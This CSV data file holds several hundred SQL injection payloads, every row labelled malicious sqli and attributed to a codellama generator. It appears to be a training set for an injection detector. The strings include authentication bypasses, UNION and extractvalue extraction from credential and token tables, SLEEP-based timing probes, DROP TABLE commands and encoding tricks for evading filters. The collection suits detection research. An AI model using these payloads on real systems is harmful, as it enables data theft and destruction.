text,label,attack_type,generator
""" UNION SELECT NULL,NULL,NULL,NULL,NULL/*x*/",1,sqli,codellama
""") AND 1=1 #",1,sqli,codellama
'%09AND%09''=''%09/*x*/,1,sqli,codellama
']%09OR%09'a'='a'%09--,1,sqli,codellama
"""+OR+1 BETWEEN 0 AND 9+/*x*/",1,sqli,codellama
"""%0aOR%0a'a'='a'%0a%23",1,sqli,codellama
') AND 1=1 -- -,1,sqli,codellama
'] AND 2>1 /*x*/,1,sqli,codellama
""" AND (SELECT COUNT(*) FROM customers)>0%23",1,sqli,codellama
'/**/AND/**/1 LIKE 1/**/#,1,sqli,codellama
""") OR ''='' %23",1,sqli,codellama
"""; DROP TABLE admin-- ",1,sqli,codellama
')%09AND%092>1%09#,1,sqli,codellama
"'] AND extractvalue(1,concat(0x7e,(SELECT status FROM credentials LIMIT 1)))",1,sqli,codellama
"'] UNION SELECT id,status,last_name,user,name FROM users--",1,sqli,codellama
')%09OR%091=2%09#,1,sqli,codellama
`%09OR%091=2%09--,1,sqli,codellama
"""/**/AND/**/'a'='a'/**/-- ",1,sqli,codellama
""")+AND+''=''+-- ",1,sqli,codellama
"""/**/OR/**/1=2/**/-- ",1,sqli,codellama
"""%0aAND%0a1 LIKE 1%0a%23",1,sqli,codellama
'%0aOR%0a'a'='a'%0a#,1,sqli,codellama
')%09OR%09'a'='a'%09%23,1,sqli,codellama
""") OR 1=1 LIMIT 1%23",1,sqli,codellama
"""); DROP TABLE tokens%23",1,sqli,codellama
'; SELECT SLEEP(5)--,1,sqli,codellama
`	AND	1=2	-- ,1,sqli,codellama
""")	OR	'a'='a'	/*x*/",1,sqli,codellama
"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -",1,sqli,codellama
`	OR	2>1	#,1,sqli,codellama
` AND (SELECT COUNT(*) FROM users)>0-- -,1,sqli,codellama
']+OR+0<1+-- -,1,sqli,codellama
'] AND 0<1 /*x*/,1,sqli,codellama
' AND (SELECT COUNT(*) FROM tokens)>0-- -,1,sqli,codellama
'] OR (SELECT username FROM orders WHERE username=907)=818,1,sqli,codellama
`+OR+1=1+--,1,sqli,codellama
"'] UNION SELECT token,uid,id FROM members-- ",1,sqli,codellama
""")/**/AND/**/1 BETWEEN 0 AND 9/**/-- -",1,sqli,codellama
'] AND 1 BETWEEN 0 AND 9 /*x*/,1,sqli,codellama
` AND (SELECT COUNT(*) FROM admin)>0#,1,sqli,codellama
""") AND extractvalue(1,concat(0x7e,(SELECT username FROM tokens LIMIT 1)))",1,sqli,codellama
')+OR+0<1+#,1,sqli,codellama
`; DROP TABLE admin--,1,sqli,codellama
""")	OR	''=''	%23",1,sqli,codellama
' OR 1=1 LIMIT 1#,1,sqli,codellama
""")%0d%0aAND%0d%0a2>1%0d%0a--",1,sqli,codellama
""")+OR+2>1+-- ",1,sqli,codellama
')%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,codellama
""")%09OR%09'a'='a'%09#",1,sqli,codellama
']+OR+1 BETWEEN 0 AND 9+--,1,sqli,codellama
"') UNION SELECT status,email,username FROM accounts-- ",1,sqli,codellama
')	OR	''=''	--,1,sqli,codellama
')/**/OR/**/0<1/**/--,1,sqli,codellama
"""); DROP TABLE members%23",1,sqli,codellama
'; DROP TABLE tokens%23,1,sqli,codellama
""")+AND+'a'='a'+/*x*/",1,sqli,codellama
`/**/OR/**/1=2/**/--,1,sqli,codellama
"""; DROP TABLE members%23",1,sqli,codellama
']+AND+'a'='a'+#,1,sqli,codellama
""") OR 'a'='a' --",1,sqli,codellama
""")%0d%0aOR%0d%0a1 LIKE 1%0d%0a-- ",1,sqli,codellama
')%0aOR%0a1=2%0a-- -,1,sqli,codellama
') UNION SELECT user FROM members%23,1,sqli,codellama
"'] UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",1,sqli,codellama
""" AND (SELECT COUNT(*) FROM members)>0--",1,sqli,codellama
')+OR+1=1+#,1,sqli,codellama
')%0d%0aOR%0d%0a''=''%0d%0a-- ,1,sqli,codellama
`; DROP TABLE users#,1,sqli,codellama
"') UNION SELECT first_name,account,id,password FROM admin%23",1,sqli,codellama
')%09OR%090<1%09%23,1,sqli,codellama
""" OR 1=1 LIMIT 1-- -",1,sqli,codellama
""")/**/AND/**/1=1/**/%23",1,sqli,codellama
'); SELECT SLEEP(5)/*x*/,1,sqli,codellama
')	OR	2>1	/*x*/,1,sqli,codellama
` AND (SELECT COUNT(*) FROM accounts)>0/*x*/,1,sqli,codellama
""")%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/",1,sqli,codellama
"""); SELECT SLEEP(5)/*x*/",1,sqli,codellama
')%0aOR%0a2>1%0a--,1,sqli,codellama
""") OR 2>1 -- -",1,sqli,codellama
')%0aOR%0a'a'='a'%0a-- ,1,sqli,codellama
'] OR 1=1 LIMIT 1-- -,1,sqli,codellama
""") UNION SELECT id,role,pwd FROM accounts-- -",1,sqli,codellama
') OR 1 LIKE 1 /*x*/,1,sqli,codellama
' OR ''='' #,1,sqli,codellama
'] OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
""")	OR	1 BETWEEN 0 AND 9	--",1,sqli,codellama
') UNION SELECT user FROM members/*x*/,1,sqli,codellama
'] OR 'a'='a' %23,1,sqli,codellama
`%09AND%092>1%09-- ,1,sqli,codellama
`; SELECT SLEEP(5)-- -,1,sqli,codellama
""" OR 1 BETWEEN 0 AND 9 #",1,sqli,codellama
']/**/OR/**/2>1/**/-- ,1,sqli,codellama
"'] UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ",1,sqli,codellama
`/**/AND/**/0<1/**//*x*/,1,sqli,codellama
']; DROP TABLE accounts/*x*/,1,sqli,codellama
""")+OR+''=''+/*x*/",1,sqli,codellama
""" UNION SELECT first_name FROM sessions/*x*/",1,sqli,codellama
"""+OR+1 LIKE 1+-- ",1,sqli,codellama
'%0aAND%0a'a'='a'%0a-- ,1,sqli,codellama
']/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,codellama
']%09OR%09''=''%09-- ,1,sqli,codellama
')%0aAND%0a''=''%0a-- ,1,sqli,codellama
""" OR 2>1 -- ",1,sqli,codellama
'] AND (SELECT COUNT(*) FROM admin)>0--,1,sqli,codellama
""")	OR	1 LIKE 1	#",1,sqli,codellama
'] AND 1=2 -- -,1,sqli,codellama
"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/",1,sqli,codellama
""")%09AND%092>1%09-- ",1,sqli,codellama
""")	OR	'a'='a'	-- -",1,sqli,codellama
']	AND	1 LIKE 1	/*x*/,1,sqli,codellama
'/**/OR/**/1 LIKE 1/**/#,1,sqli,codellama
`	AND	1=1	-- -,1,sqli,codellama
'+OR+''=''+%23,1,sqli,codellama
'	OR	'a'='a'	%23,1,sqli,codellama
` OR 1=1 LIMIT 1%23,1,sqli,codellama
'] AND (SELECT COUNT(*) FROM members)>0#,1,sqli,codellama
""") AND 1=2 /*x*/",1,sqli,codellama
')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a#,1,sqli,codellama
"""+AND+''=''+#",1,sqli,codellama
"""/**/OR/**/1=1/**/-- ",1,sqli,codellama
""")%0d%0aOR%0d%0a1=2%0d%0a-- -",1,sqli,codellama
"""%0d%0aOR%0d%0a''=''%0d%0a-- ",1,sqli,codellama
`%09OR%092>1%09-- -,1,sqli,codellama
"') UNION SELECT last_name,first_name,id,uid,password FROM credentials/*x*/",1,sqli,codellama
')%0aAND%0a2>1%0a/*x*/,1,sqli,codellama
""") AND (SELECT COUNT(*) FROM members)>0%23",1,sqli,codellama
""")%09OR%091 LIKE 1%09--",1,sqli,codellama
`+OR+1 LIKE 1+#,1,sqli,codellama
'%09AND%09''=''%09-- -,1,sqli,codellama
']	OR	2>1	--,1,sqli,codellama
']/**/AND/**/1 BETWEEN 0 AND 9/**//*x*/,1,sqli,codellama
']	OR	1=2	/*x*/,1,sqli,codellama
'+AND+1=1+/*x*/,1,sqli,codellama
'%09AND%091 BETWEEN 0 AND 9%09-- ,1,sqli,codellama
""" OR 1=1 LIMIT 1%23",1,sqli,codellama
']; SELECT SLEEP(5)#,1,sqli,codellama
"""/**/AND/**/0<1/**/-- -",1,sqli,codellama
')+AND+1 LIKE 1+%23,1,sqli,codellama
' OR 1=1 /*x*/,1,sqli,codellama
'/**/OR/**/1 BETWEEN 0 AND 9/**/#,1,sqli,codellama
` OR 1=1 LIMIT 1#,1,sqli,codellama
""" OR 1=1 LIMIT 1/*x*/",1,sqli,codellama
` AND 0<1 /*x*/,1,sqli,codellama
`%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23,1,sqli,codellama
"' UNION SELECT first_name,email,status,password,id,role FROM members/*x*/",1,sqli,codellama
"""); DROP TABLE admin/*x*/",1,sqli,codellama
""")	AND	''=''	/*x*/",1,sqli,codellama
""" AND (SELECT COUNT(*) FROM credentials)>0/*x*/",1,sqli,codellama
"""; DROP TABLE admin-- -",1,sqli,codellama
'%0aAND%0a2>1%0a-- -,1,sqli,codellama
'] AND (SELECT COUNT(*) FROM accounts)>0#,1,sqli,codellama
']+AND+''=''+-- ,1,sqli,codellama
""") OR 2>1 --",1,sqli,codellama
"""%0d%0aOR%0d%0a0<1%0d%0a#",1,sqli,codellama
""")	AND	''=''	-- ",1,sqli,codellama
""")%0d%0aOR%0d%0a1 LIKE 1%0d%0a%23",1,sqli,codellama
')	OR	1=2	#,1,sqli,codellama
"""	AND	2>1	--",1,sqli,codellama
""") OR 1 LIKE 1 -- -",1,sqli,codellama
')%0d%0aOR%0d%0a1=2%0d%0a#,1,sqli,codellama
')	OR	'a'='a'	/*x*/,1,sqli,codellama
""")+AND+1=2+%23",1,sqli,codellama
' AND 2>1 %23,1,sqli,codellama
'; SELECT SLEEP(5)#,1,sqli,codellama
' OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
"""/**/OR/**/1=1/**//*x*/",1,sqli,codellama
"""	OR	''=''	--",1,sqli,codellama
""") UNION SELECT NULL--",1,sqli,codellama
"') UNION SELECT role,token,user,last_name,name,username FROM sessions#",1,sqli,codellama
` AND 1=2 /*x*/,1,sqli,codellama
""")%09AND%09'a'='a'%09--",1,sqli,codellama
"""/**/OR/**/1 BETWEEN 0 AND 9/**/--",1,sqli,codellama
']+AND+2>1+--,1,sqli,codellama
`/**/AND/**/''=''/**/-- -,1,sqli,codellama
"""/**/OR/**/1=2/**/%23",1,sqli,codellama
`/**/AND/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,codellama
"""	OR	1=2	-- -",1,sqli,codellama
']+OR+1=1+-- ,1,sqli,codellama
` AND (SELECT COUNT(*) FROM accounts)>0%23,1,sqli,codellama
']%0aAND%0a'a'='a'%0a--,1,sqli,codellama
`+OR+1=2+--,1,sqli,codellama
'%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,codellama
' OR 1=1 LIMIT 1-- -,1,sqli,codellama
']%0d%0aOR%0d%0a2>1%0d%0a-- -,1,sqli,codellama
""")%0aOR%0a2>1%0a--",1,sqli,codellama
']%0d%0aOR%0d%0a1=2%0d%0a/*x*/,1,sqli,codellama
""") AND (SELECT COUNT(*) FROM tokens)>0#",1,sqli,codellama
"' UNION SELECT NULL,NULL,NULL%23",1,sqli,codellama
""")	AND	0<1	/*x*/",1,sqli,codellama
') AND 0<1 /*x*/,1,sqli,codellama
'); DROP TABLE admin#,1,sqli,codellama
"""/**/AND/**/''=''/**//*x*/",1,sqli,codellama
"' UNION SELECT NULL,NULL-- -",1,sqli,codellama
""")%0aOR%0a0<1%0a-- -",1,sqli,codellama
""") OR 1=1 LIMIT 1#",1,sqli,codellama
`%09OR%09'a'='a'%09#,1,sqli,codellama
') AND (SELECT COUNT(*) FROM customers)>0-- ,1,sqli,codellama
""") UNION SELECT name,pwd,role,last_name,status FROM users-- -",1,sqli,codellama
"'] UNION SELECT NULL,NULL,NULL,NULL-- -",1,sqli,codellama
')%0d%0aAND%0d%0a0<1%0d%0a-- -,1,sqli,codellama
'	OR	''=''	/*x*/,1,sqli,codellama
"""+AND+'a'='a'+-- -",1,sqli,codellama
' AND (SELECT COUNT(*) FROM accounts)>0/*x*/,1,sqli,codellama
'/**/OR/**/0<1/**/-- ,1,sqli,codellama
']%09OR%091=1%09-- -,1,sqli,codellama
"""+AND+1=1+%23",1,sqli,codellama
']	OR	1 BETWEEN 0 AND 9	/*x*/,1,sqli,codellama
"` AND extractvalue(1,concat(0x7e,(SELECT role FROM users LIMIT 1)))",1,sqli,codellama
""" AND (SELECT COUNT(*) FROM sessions)>0--",1,sqli,codellama
`; SELECT SLEEP(5)%23,1,sqli,codellama
'%09OR%091=1%09-- -,1,sqli,codellama
""") AND 0<1 #",1,sqli,codellama
`/**/OR/**/1=1/**/--,1,sqli,codellama
"""/**/AND/**/1 BETWEEN 0 AND 9/**/--",1,sqli,codellama
` AND 1 BETWEEN 0 AND 9 #,1,sqli,codellama
` AND (SELECT COUNT(*) FROM admin)>0-- -,1,sqli,codellama
'	OR	1=2	%23,1,sqli,codellama
""")%09AND%091 BETWEEN 0 AND 9%09--",1,sqli,codellama
"""%09OR%09'a'='a'%09--",1,sqli,codellama
"""); SELECT SLEEP(5)#",1,sqli,codellama
']+AND+''=''+#,1,sqli,codellama
""") OR (SELECT pwd FROM accounts WHERE pwd=681)=555",1,sqli,codellama
`%0aAND%0a0<1%0a-- ,1,sqli,codellama
"""; SELECT SLEEP(5)/*x*/",1,sqli,codellama
"""%0d%0aOR%0d%0a0<1%0d%0a/*x*/",1,sqli,codellama
""")%0aOR%0a1=2%0a-- ",1,sqli,codellama
']/**/AND/**/1 BETWEEN 0 AND 9/**/--,1,sqli,codellama
'	AND	''=''	%23,1,sqli,codellama
'); DROP TABLE staff-- ,1,sqli,codellama
` AND 0<1 #,1,sqli,codellama
']; DROP TABLE admin%23,1,sqli,codellama
""")%0d%0aAND%0d%0a1=1%0d%0a/*x*/",1,sqli,codellama
')/**/OR/**/''=''/**/-- -,1,sqli,codellama
']%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",1,sqli,codellama
` AND 1 LIKE 1 %23,1,sqli,codellama
'%09OR%09''=''%09-- -,1,sqli,codellama
' OR 1=1 LIMIT 1-- ,1,sqli,codellama
""")/**/AND/**/0<1/**/-- ",1,sqli,codellama
')	OR	1 BETWEEN 0 AND 9	%23,1,sqli,codellama
"""	OR	1 BETWEEN 0 AND 9	/*x*/",1,sqli,codellama
')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a--,1,sqli,codellama
""")%0aAND%0a1=2%0a--",1,sqli,codellama
"` UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1,sqli,codellama
']	OR	1=1	#,1,sqli,codellama
']+AND+1 LIKE 1+/*x*/,1,sqli,codellama
""") AND (SELECT COUNT(*) FROM staff)>0%23",1,sqli,codellama
']	AND	0<1	/*x*/,1,sqli,codellama
' AND (SELECT COUNT(*) FROM members)>0-- -,1,sqli,codellama
`; SELECT SLEEP(5)#,1,sqli,codellama
'] AND (SELECT COUNT(*) FROM admin)>0/*x*/,1,sqli,codellama
' AND (SELECT COUNT(*) FROM admin)>0#,1,sqli,codellama
'; DROP TABLE sessions%23,1,sqli,codellama
"""); DROP TABLE sessions%23",1,sqli,codellama
""") AND 1=1 /*x*/",1,sqli,codellama
'	AND	1 LIKE 1	%23,1,sqli,codellama
"""; SELECT SLEEP(5)-- ",1,sqli,codellama
'] AND (SELECT COUNT(*) FROM orders)>0#,1,sqli,codellama
']%0aOR%0a2>1%0a-- -,1,sqli,codellama
"""); SELECT SLEEP(5)-- ",1,sqli,codellama
""")	AND	0<1	-- -",1,sqli,codellama
']%0d%0aOR%0d%0a1=2%0d%0a-- ,1,sqli,codellama
'%0aAND%0a1=2%0a-- ,1,sqli,codellama
') OR (SELECT token FROM admin WHERE token=860)=934,1,sqli,codellama
""")%09AND%091 BETWEEN 0 AND 9%09#",1,sqli,codellama
']/**/AND/**/''=''/**/-- ,1,sqli,codellama
'	AND	'a'='a'	#,1,sqli,codellama
'); SELECT SLEEP(5)%23,1,sqli,codellama
`; DROP TABLE users-- ,1,sqli,codellama
"') UNION SELECT NULL,NULL,NULL-- -",1,sqli,codellama
']; SELECT SLEEP(5)--,1,sqli,codellama
` OR 1=1 LIMIT 1-- -,1,sqli,codellama
` OR 1=1 %23,1,sqli,codellama
')%09OR%092>1%09-- -,1,sqli,codellama
']%09OR%091=1%09#,1,sqli,codellama
"') UNION SELECT NULL,NULL,NULL/*x*/",1,sqli,codellama
')%0aOR%0a1=2%0a#,1,sqli,codellama
`/**/AND/**/1=1/**/--,1,sqli,codellama
'] AND ''='' --,1,sqli,codellama
"""; DROP TABLE orders#",1,sqli,codellama
""")%09OR%091=2%09--",1,sqli,codellama
""") AND (SELECT COUNT(*) FROM customers)>0-- -",1,sqli,codellama
""")%0aAND%0a0<1%0a/*x*/",1,sqli,codellama
'%0aOR%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,codellama
'%0d%0aAND%0d%0a1 LIKE 1%0d%0a-- -,1,sqli,codellama
`+OR+1=2+-- ,1,sqli,codellama
')%0aOR%0a2>1%0a%23,1,sqli,codellama
']/**/AND/**/0<1/**/--,1,sqli,codellama
""")%0d%0aOR%0d%0a1=1%0d%0a%23",1,sqli,codellama
')+AND+'a'='a'+#,1,sqli,codellama
"` UNION SELECT uid,status,token FROM users-- ",1,sqli,codellama
"""%0d%0aAND%0d%0a1 LIKE 1%0d%0a-- ",1,sqli,codellama
""" OR (SELECT name FROM sessions WHERE name=530)=320",1,sqli,codellama
'; SELECT SLEEP(5)-- -,1,sqli,codellama
') OR 0<1 %23,1,sqli,codellama
"""%09OR%090<1%09#",1,sqli,codellama
""" OR 1=1 LIMIT 1#",1,sqli,codellama
""")%09OR%090<1%09#",1,sqli,codellama
']; DROP TABLE admin--,1,sqli,codellama
`+OR+''=''+#,1,sqli,codellama
')%09AND%091=1%09-- -,1,sqli,codellama
'%0aAND%0a'a'='a'%0a/*x*/,1,sqli,codellama
']; SELECT SLEEP(5)%23,1,sqli,codellama
""" AND (SELECT COUNT(*) FROM accounts)>0#",1,sqli,codellama
'%0d%0aOR%0d%0a0<1%0d%0a%23,1,sqli,codellama
"""/**/AND/**/1=1/**/#",1,sqli,codellama
'%09OR%09''=''%09--,1,sqli,codellama
"""); DROP TABLE customers#",1,sqli,codellama
"""+AND+1 LIKE 1+--",1,sqli,codellama
'); SELECT SLEEP(5)-- ,1,sqli,codellama
""")%09OR%090<1%09-- -",1,sqli,codellama
"""%09OR%091 LIKE 1%09-- ",1,sqli,codellama
"') UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,sqli,codellama
`; DROP TABLE users-- -,1,sqli,codellama
']%0d%0aAND%0d%0a''=''%0d%0a/*x*/,1,sqli,codellama
""") AND (SELECT COUNT(*) FROM accounts)>0-- -",1,sqli,codellama
""" OR 1=1 %23",1,sqli,codellama
"""	OR	''=''	%23",1,sqli,codellama
'] OR 0<1 %23,1,sqli,codellama
') AND (SELECT COUNT(*) FROM accounts)>0-- ,1,sqli,codellama
']%0aAND%0a1=2%0a/*x*/,1,sqli,codellama
'%09OR%09'a'='a'%09%23,1,sqli,codellama
""")%09AND%090<1%09/*x*/",1,sqli,codellama
"""; SELECT SLEEP(5)#",1,sqli,codellama
`%0aOR%0a1 BETWEEN 0 AND 9%0a/*x*/,1,sqli,codellama
')%09AND%091=2%09-- -,1,sqli,codellama
')+OR+0<1+%23,1,sqli,codellama
') OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
""" AND (SELECT COUNT(*) FROM credentials)>0%23",1,sqli,codellama
"""/**/OR/**/'a'='a'/**/-- -",1,sqli,codellama
"""; DROP TABLE users-- -",1,sqli,codellama
` AND (SELECT COUNT(*) FROM tokens)>0--,1,sqli,codellama
